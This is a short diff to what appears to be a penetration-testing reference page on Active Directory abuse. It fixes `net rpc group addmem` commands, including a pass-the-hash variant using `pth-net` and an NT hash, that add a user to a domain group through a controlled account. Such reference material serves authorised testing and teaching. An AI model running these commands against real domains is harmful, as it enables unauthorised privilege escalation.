@@ -23,10 +23,10 @@ It can also be achieved from UNIX-like system with [net](https://linux.die.net/m
 
 ```bash
 # With net and cleartext credentials (will be prompted)
-net rpc group addmem $TargetGroup $TargetUser -S $DomainController
+net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser -S $DomainController
 
 # With net and cleartext credentials
-net rpc group addmem $TargetGroup $TargetUser%$Password -S $DomainController
+net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser%$Password -S $DomainController
 
 # With Pass-the-Hash
 pth-net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser%ffffffffffffffffffffffffffffffff:$NThash -S $DomainController
